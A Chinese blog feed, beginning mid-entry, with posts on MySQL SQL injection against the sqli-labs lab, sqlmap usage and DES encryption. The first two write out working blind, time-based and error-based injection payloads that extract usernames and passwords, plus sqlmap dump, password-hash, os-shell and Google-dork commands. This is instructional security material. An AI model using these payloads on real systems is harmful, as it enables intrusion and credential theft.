class="string">#判断所有表名字符长度。</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99--+</span><br><span class="line"><span class="comment">#逐一判断表名</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27;))&gt;20--+</span></span><br><span class="line"><span class="string">#判断所有字段名的长度</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),<span class="number">1</span>,<span class="number">1</span>))&gt;99--+</span><br><span class="line"><span class="comment">#逐一判断字段名。</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and length((select group_concat(username,password) from users))&gt;109--+</span></span><br><span class="line"><span class="string">#判断字段内容长度</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and ascii(substr((select group_concat(username,password) from users),<span class="number">1</span>,<span class="number">1</span>))&gt;50--+</span><br><span class="line"><span class="comment">#逐一检测内容。</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h1><ul><li>有时候，输入任何东西显示的内容都是一样的，这样布尔注入就不能使用了</li><li>这个时候我们可以使用时间注入，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了if函数和sleep()函数。</li><li>if(a,sleep(10),1)如果a结果是真的，那么执行sleep(10)页面延迟10秒，如果a的结果是假，执行1，页面不延迟。</li></ul><h2 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h2><ul><li>以sqli-labs-less-9为例</li><li>因为只是用法不同，查询过程时一样的，所有可以参考以下内容<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and if(1=1,sleep(5),1)--+</span></span><br><span class="line"><span class="string">#判断参数构造。</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>and <span class="keyword">if</span>(length((select database()))&gt;9,<span class="built_in">sleep</span>(5),1)--+</span><br><span class="line"><span class="comment">#判断数据库名长度</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span></span><br><span class="line"><span class="string">#逐一判断数据库字符</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>and <span class="keyword">if</span>(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,<span class="built_in">sleep</span>(5),1)--+</span><br><span class="line"><span class="comment">#判断所有表名长度</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span></span><br><span class="line"><span class="string">#逐一判断表名</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>and <span class="keyword">if</span>(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,<span class="built_in">sleep</span>(5),1)--+</span><br><span class="line"><span class="comment">#判断所有字段名的长度</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27;),1,1))&gt;99,sleep(5),1)--+</span></span><br><span class="line"><span class="string">#逐一判断字段名。</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and <span class="keyword">if</span>(length((select group_concat(username,password) from users))&gt;109,<span class="built_in">sleep</span>(5),1)--+</span><br><span class="line"><span class="comment">#判断字段内容长度</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span></span><br><span class="line"><span class="string">#逐一检测内容。</span></span><br></pre></td></tr></table></figure></li><li>如果结果为真，页面会延迟5秒显示，为假，则不会延迟，将直接显示</li></ul><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="报错注入的定义"><a href="#报错注入的定义" class="headerlink" title="报错注入的定义"></a>报错注入的定义</h2><ul><li>当网站的页面上没有显示位用于展示SQL语句执行后的结果，但是sql语句执行可以输出错误信息，那么攻击者可以利用注入过程中返回的错误信息进行判断。</li><li>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</li><li>以sqli-labs-less-17为例</li></ul><h2 id="常用的函数"><a href="#常用的函数" class="headerlink" title="常用的函数"></a>常用的函数</h2><ol><li>extractvalue()</li><li>updataxml()</li><li>count()+rand()+floor()+group by()导致的主键重复</li></ol><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><ul><li><code>extractvalue(XML_document,XPath_string)</code></li><li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</li><li>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</li><li>作用：从XML_document中提取符合XPATH_string的值，当我们XPath_string语法报错时候就会报错，下面的语法就是错误的。concat和我前面说的的group_concat作用一样<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921232830.png" alt="image.png"></li><li>因为只是用法不同，查询过程时一样的，所有可以参考以下内容</li><li>在最后一步爆字段内容时候，<strong>会报错</strong>，原因是mysql数据不支持查询和更新是同一张表。所以我们<strong>需要加一个中间表</strong>。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; and (extractvalue(1,concat(0x5c,version(),0x5c)))#    </span></span><br><span class="line"><span class="string">爆版本</span></span><br><span class="line"><span class="string">1&#x27;</span> and (extractvalue(1,concat(0x5c,database(),0x5c)))<span class="comment">#   </span></span><br><span class="line">爆数据库</span><br><span class="line">1<span class="string">&#x27; and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c)))#   </span></span><br><span class="line"><span class="string">爆表名</span></span><br><span class="line"><span class="string">1&#x27;</span> and (extractvalue(1,concat(0x5c,(<span class="keyword">select</span> group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_schema=database() and table_name=<span class="string">&#x27;users&#x27;</span>),0x5c)))<span class="comment"># </span></span><br><span class="line">爆字段名</span><br><span class="line">1<span class="string">&#x27; and (extractvalue(1,concat(0x5c,(select password from (select password from users where username=&#x27;</span>admin1<span class="string">&#x27;) b) ,0x5c)))#</span></span><br><span class="line"><span class="string">爆字段内容该格式针对mysql数据库。</span></span><br><span class="line"><span class="string">1&#x27;</span> and (extractvalue(1,concat(0x5c,(<span class="keyword">select</span> group_concat(username,<span class="string">&#x27;:&#x27;</span>,password) from (<span class="keyword">select</span> username,password from <span class="built_in">users</span>)a ),0x5c)))<span class="comment">#</span></span><br><span class="line">爆字段内容。</span><br></pre></td></tr></table></figure></li></ul><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><ul><li><code>updatexml (XML_document, XPath_string, new_value)</code></li><li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</li><li>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</li><li>第三个参数：new_value，String格式，替换查找到的符合条件的数据</li><li>作用：改变文档中符合条件的节点的值，改变XML_document中符合XPATH_string的值</li><li>当我们XPath_string语法报错时候就会报错，updatexml()报错注入和extractvalue()报错注入基本差不多。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">123<span class="string">&#x27; and (updatexml(1,concat(0x5c,version(),0x5c),1))# 爆版本</span></span><br><span class="line"><span class="string">123&#x27;</span> and (updatexml(1,concat(0x5c,database(),0x5c),1))<span class="comment"># 爆数据库</span></span><br><span class="line">123<span class="string">&#x27; and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#</span></span><br><span class="line"><span class="string">爆表名</span></span><br><span class="line"><span class="string">123&#x27;</span> and (updatexml(1,concat(0x5c,(<span class="keyword">select</span> group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> and table_name =<span class="string">&#x27;users&#x27;</span>),0x5c),1))<span class="comment">#</span></span><br><span class="line">爆字段名</span><br><span class="line">123<span class="string">&#x27; and (updatexml(1,concat(0x5c,(select password from (select password from users where username=&#x27;</span>admin1<span class="string">&#x27;) b),0x5c),1))#</span></span><br><span class="line"><span class="string">爆密码该格式针对mysql数据库。爆其他表就可以，下面是爆emails表</span></span><br><span class="line"><span class="string">123&#x27;</span> and (updatexml(1,concat(0x5c,(<span class="keyword">select</span> group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> and table_name =<span class="string">&#x27;emails&#x27;</span>),0x5c),1))<span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27; and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))#   </span></span><br><span class="line"><span class="string">爆字段内容。</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h2><ul><li>group by 报错注入比较复杂，可以先看看<a href="https://blog.csdn.net/m0_53065491/article/details/121893986" title="深入理解group by报错注入_m0_53065491的博客-CSDN博客">group by理解</a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">123<span class="string">&#x27; and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#     爆数据库</span></span><br><span class="line"><span class="string">123&#x27;</span> and (<span class="keyword">select</span> count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))<span class="comment">#      爆数据库版本</span></span><br><span class="line"> </span><br><span class="line">1<span class="string">&#x27; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#    通过修改limit后面数字一个一个爆表</span></span><br><span class="line"><span class="string">1&#x27;</span> and (<span class="keyword">select</span> count(*) from information_schema.tables <span class="built_in">where</span> table_schema=database() group by concat(0x7e,(<span class="keyword">select</span> group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database()),0x7e,floor(rand(0)*2)))<span class="comment">#        爆出所有表</span></span><br><span class="line"></span><br><span class="line">1<span class="string">&#x27; and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27;),0x7e,floor(rand(0)*2)))#    爆出所有字段名</span></span><br><span class="line"><span class="string">1&#x27;</span> and (<span class="keyword">select</span> count(*) from information_schema.columns group by concat(0x7e,(<span class="keyword">select</span> group_concat(username,password) from <span class="built_in">users</span>),0x7e,floor(rand(0)*2)))<span class="comment">#    爆出所有字段名</span></span><br><span class="line"> </span><br><span class="line">1<span class="string">&#x27; and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username=&#x27;</span>admin1<span class="string">&#x27;),0x7e,floor(rand(0)*2)))a)#    爆出该账户的密码。</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MYSQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试工具-sqlmap</title>
      <link href="/2023/09/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-SQLMap/"/>
      <url>/2023/09/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-SQLMap/</url>
      
        <content type="html"><![CDATA[<h1 id="SQLMap简介"><a href="#SQLMap简介" class="headerlink" title="SQLMap简介"></a>SQLMap简介</h1><ul><li>SQLMAP是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL和SQL注入漏洞，其广泛的功能和选项包括数据库指纹，枚举，数据库提权，访问目标文件系统，并在获取操作权限时执行任意命令。</li><li>支持的数据库有<code>MySQL</code>, <code>Oracle</code>,<code>PostgreSQL</code>, <code>Microsoft SQL Server</code>, <code>Microsoft Access</code>, <code>IBM DB2</code>, <code>SQLite</code>, <code>Firebird</code>,<code>Sybase</code>和<code>SAP MaxDB</code>。</li><li>sqlmap支持五种不同的注入模式：</li></ul><ol><li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入；</li><li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</li><li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</li><li>联合查询注入，可以使用union的情况下的注入；</li><li>堆查询注入，可以同时执行多条语句的执行时的注入；</li></ol><ul><li>以下采用sqli-labs靶场为实例工具</li></ul><h1 id="SQLMap基础操作"><a href="#SQLMap基础操作" class="headerlink" title="SQLMap基础操作"></a>SQLMap基础操作</h1><h2 id="常用命令及参数"><a href="#常用命令及参数" class="headerlink" title="常用命令及参数"></a>常用命令及参数</h2><ul><li>查看sqlmap的命令帮助手册<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-h,--help       #显示基本帮助信息并退出</span><br><span class="line">-u  &quot;url&quot;#检测注入点</span><br><span class="line">--dbs#列出所有数据库的名称</span><br><span class="line">--current-db#列出当前数据库的名称</span><br><span class="line">-D#指定一个数据库</span><br><span class="line">--table#列出所有表名</span><br><span class="line">-T#指定表名</span><br><span class="line">--columns#列出所有字段名</span><br><span class="line">-C#指定字段</span><br><span class="line">--dump#列出字段内容</span><br><span class="line">-r XXX.txt      #post注入，XXX.txt为http数据包</span><br><span class="line">-cookie         #指定cookie</span><br><span class="line">-os -shell      #获取shell</span><br><span class="line">sqlmap -g &quot;inurl:php?id=&quot;   #利用Google自动搜索注入点</span><br></pre></td></tr></table></figure></li></ul><h2 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h2><ul><li>以sqli-labs-less-1为例</li><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921212017.png" alt="image.png"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[21:04:29] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web application technology: PHP 5.4.45, Apache 2.4.39</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.6</span><br></pre></td></tr></table></figure></li><li>出现以上信息，显示存在注入</li><li>当SQLMap执行该命令时，它会执行以下步骤：</li></ul><ol><li>判断可注入的参数；</li><li>判断可以用哪种SQL注入技术来注入；</li><li>识别出哪种数据库；</li><li>根据用户选择，读取哪些数据。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: <span class="built_in">id</span> (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: <span class="built_in">id</span>=2<span class="string">&#x27; AND 4622=4622 AND &#x27;</span>Ihts<span class="string">&#x27;=&#x27;</span>Ihts</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: <span class="built_in">id</span>=2<span class="string">&#x27; AND GTID_SUBSET(CONCAT(0x7171766271,(SELECT (ELT(8159=8159,1))),0x7170766271),8159) AND &#x27;</span>UFpr<span class="string">&#x27;=&#x27;</span>UFpr</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: <span class="built_in">id</span>=2<span class="string">&#x27; AND (SELECT 6178 FROM (SELECT(SLEEP(5)))AVtu) AND &#x27;</span>YciD<span class="string">&#x27;=&#x27;</span>YciD</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: <span class="built_in">id</span>=-8329<span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x7171766271,0x644b754a625073464c596c784579745179626a55784b52796e49735569565054525245766241426c,0x7170766271),NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br></pre></td></tr></table></figure></li></ol><ul><li>给出的信息当中显示，可以注入的参数是id</li><li>可以使用布尔盲注、报错注入、时间注入、联合注入</li></ul><h2 id="列出所有数据库的名字"><a href="#列出所有数据库的名字" class="headerlink" title="列出所有数据库的名字"></a>列出所有数据库的名字</h2><ul><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; --dbs</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921212634.png" alt="image.png"></li><li>通过这个命令可以直接获取到所有数据库的名字</li><li>当继续注入时，<code>-dbs</code>缩写成<code>-D XXX</code>，意思是在XXX数据库中继续查询其他数据</li></ul><h2 id="获取数据库中的表名"><a href="#获取数据库中的表名" class="headerlink" title="获取数据库中的表名"></a>获取数据库中的表名</h2><ul><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; -D security --tables</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921212938.png" alt="image.png"></li><li>通过这个命令，可以获取到指定数据库的所有表名</li><li>当继续注入时，<code>-tables</code>缩写成<code>-T</code>，意思是在指定表继续查询</li></ul><h2 id="获取表中的字段名"><a href="#获取表中的字段名" class="headerlink" title="获取表中的字段名"></a>获取表中的字段名</h2><ul><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; -D security -T users --columns</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921213155.png" alt="image.png"></li><li>通过这个命令，可以获取到指定表的所有字段名</li><li>在后续的注入中， -columns缩写成-C，意思是在指定字段名查询</li></ul><h2 id="获取字段内容"><a href="#获取字段内容" class="headerlink" title="获取字段内容"></a>获取字段内容</h2><ul><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; -D security -T users -C username,password --dump</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921213525.png" alt="image.png"></li><li>通过这个命令，可以获取到指定字段内容</li></ul><h2 id="获取数据库的所有用户"><a href="#获取数据库的所有用户" class="headerlink" title="获取数据库的所有用户"></a>获取数据库的所有用户</h2><ul><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; --users</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921213822.png" alt="image.png"></li><li>该命令的作用是列出数据库的所有用户</li><li>在当前用户有权限读取包含所有用户的表的权限时，使用该命令就可以列出所有管理用户。</li></ul><h2 id="获取数据库用户的密码"><a href="#获取数据库用户的密码" class="headerlink" title="获取数据库用户的密码"></a>获取数据库用户的密码</h2><ul><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; --password</code></li><li>该命令的作用是列出数据库用户的密码，如下所示,如果当前用户有读取包含用户密码的权限， SQLMap会先列举出用户，然后列出Hash ，并尝试破解。</li></ul><h2 id="判断文本中的请求是否存在注入"><a href="#判断文本中的请求是否存在注入" class="headerlink" title="判断文本中的请求是否存在注入"></a>判断文本中的请求是否存在注入</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921214700.png" alt="image.png"></p><ul><li>用burpsuite抓包工具抓取到加载HTTP请求，将内容放入文本文档当中<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921214919.png" alt="image.png"></li><li><code>sqlmap -r less-1.txt  </code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921215213.png" alt="image.png"></li><li><code>-r</code>通常用于存在cookie注入时使用</li></ul><h1 id="SQLMap进阶操作"><a href="#SQLMap进阶操作" class="headerlink" title="SQLMap进阶操作"></a>SQLMap进阶操作</h1><h2 id="探测等级"><a href="#探测等级" class="headerlink" title="探测等级"></a>探测等级</h2><ul><li><code>--level 5</code>指需要执行的测试等级，一共有5个等级</li><li>默认是1，这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTP cookie在level为2时就会测试，HTTP User-Agent&#x2F;Referer头在level为3时就会测试。</li><li>总之，在不确定哪个Payload或者参数为注入点时，为了确保全面性，建议使用高的level值。</li></ul><h2 id="当前用户是否为管理权限"><a href="#当前用户是否为管理权限" class="headerlink" title="当前用户是否为管理权限"></a>当前用户是否为管理权限</h2><ul><li>该命令用于查看当前账户是否为数据库管理员账户</li><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; --is-dba</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921220356.png" alt="image.png"></li></ul><h2 id="列出数据库管理员角色"><a href="#列出数据库管理员角色" class="headerlink" title="列出数据库管理员角色"></a>列出数据库管理员角色</h2><ul><li>该命令用于查看数据库用户的角色。如果当前用户有权限读取包含所有用户的 表，输入该命令会列举出每个用户的角色，也可以用-U参数指定想看哪个用户的角色。</li><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; --roles</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921220941.png" alt="image.png"></li></ul><h2 id="HTTP-Referer头"><a href="#HTTP-Referer头" class="headerlink" title="HTTP Referer头"></a>HTTP Referer头</h2><ul><li><strong><code>Referer</code></strong> 请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 <code>Referer</code> 请求头识别访问来源，可能会以此进行统计分析、日志记录以及缓存优化等。</li><li>SQLMap可以在请求中伪造HTTP中的refer”当level参数设定为3或3 以上时，会尝试对refere注入。可以使用refere命令来欺骗，如 <code>--referer http:// www.baidu.com</code></li></ul><h2 id="运行自定义SQL语句"><a href="#运行自定义SQL语句" class="headerlink" title="运行自定义SQL语句"></a>运行自定义SQL语句</h2><ul><li>该命令用于执行指定的SQL语句</li><li>以<code>select * from users limit 0,1</code>为例<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921221923.png" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DES加密原理</title>
      <link href="/2023/09/13/DES%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86/"/>
      <url>/2023/09/13/DES%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="DES算法"><a href="#DES算法" class="headerlink" title="DES算法"></a>DES算法</h1><h2 id="DES算法简介"><a href="#DES算法简介" class="headerlink" title="DES算法简介"></a>DES算法简介</h2><ul><li>DES是一种明文分组为64比特，有效密钥56比特，输出密文64比特的，具有16轮迭代的Feistel密码算法。</li><li>DES由初始置换，16轮迭代，初始逆置换组成。</li></ul><h2 id="算法加密流程描述"><a href="#算法加密流程描述" class="headerlink" title="算法加密流程描述"></a>算法加密流程描述</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913215648.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913222123.png" alt="image.png"></p><ol><li>输入64位明文，进行初始置换IP</li><li>将明文分成左右两部分，为L0，R0，各32位</li><li>在密钥的控制下，进行16次运算</li><li>运算结束将左右交换，连接在一起再进行逆置换</li><li>最后输出64位密文</li></ol><h1 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h1><h2 id="初始置换"><a href="#初始置换" class="headerlink" title="初始置换"></a>初始置换</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913220034.png" alt="image.png"></p><ul><li>将输入的明文按照上表进行置换</li><li>例如，输出块的第1位对应输入块的第58位，第2位对应第50位，依次类推</li><li>则输入块是D1~D64，输出块是D58，D50，D42，……，D15，D7；</li><li>然后将输出块左右分成L0和R0</li></ul><h2 id="加密16轮迭代"><a href="#加密16轮迭代" class="headerlink" title="加密16轮迭代"></a>加密16轮迭代</h2><h3 id="密钥置换"><a href="#密钥置换" class="headerlink" title="密钥置换"></a>密钥置换</h3><ul><li>密钥共有64位，16轮迭代后为48为子密钥</li></ul><ol><li>将密钥的奇偶位忽略不计（就是每个字节的第八位），64位变为56位，根本选择置换PC-1将56位的密钥分成左C0（28位），右D0（28位），表中第8、16、24、…、64位被忽略<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913220958.png" alt="image.png"></li><li>根据轮数，将Cn，Dn进行左移<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913221141.png" alt="image.png"></li></ol><ul><li>比如C0和D0进行第一次左移，根据表格，是左移一位，得到以下<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C1</span><br><span class="line">49,41,33,25,17,9,1,  </span><br><span class="line">58,50,42,34,26,18,10,  </span><br><span class="line">2,59,51,43,35,27,19,  </span><br><span class="line">11,3,60,52,44,36,57</span><br><span class="line">D1</span><br><span class="line">55,47,39,31,23,15,7,  </span><br><span class="line">62,54,46,38,30,22,14,  </span><br><span class="line">6,61,53,45,37,29,21,  </span><br><span class="line">13,5,28,20,12,4,63</span><br></pre></td></tr></table></figure></li></ul><ol start="3"><li>然后C1和D1合并，经过置换选择表2（PC-2），生成48位的子密钥，表格如下<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913221434.png" alt="image.png"></li><li>此后每次都进行拆分，然后左移，再合并，然后经过PC-2生成子密钥K</li><li>依次类推，得到K1~K16</li></ol><h3 id="扩展置换E"><a href="#扩展置换E" class="headerlink" title="扩展置换E"></a>扩展置换E</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913221636.png" alt="image.png"></p><ul><li>根据以上表格，将32位扩展为48位</li><li>中间为原本的32位，两边位扩展的位，总共48位</li></ul><h3 id="S-盒代替"><a href="#S-盒代替" class="headerlink" title="S-盒代替"></a>S-盒代替</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913221941.png" alt="image.png"></p><ol><li>Rn经过扩展，为48位，与48位的Kn进行异或运算，得到48位输出块，为8个6bit的串，分别为B1~B8</li><li>根据上表，对应S1~S8，进行代替操作，这一步是将6bit的串，前后各一位对应纵列，中间四位对应行，例如110010以S1为例，在行当中找到1001对应的十六进制9，在列当中找到10对应的十六进制2，对应十六进制12，则输出为1100</li></ol><h3 id="P-盒置换"><a href="#P-盒置换" class="headerlink" title="P-盒置换"></a>P-盒置换</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913222957.png" 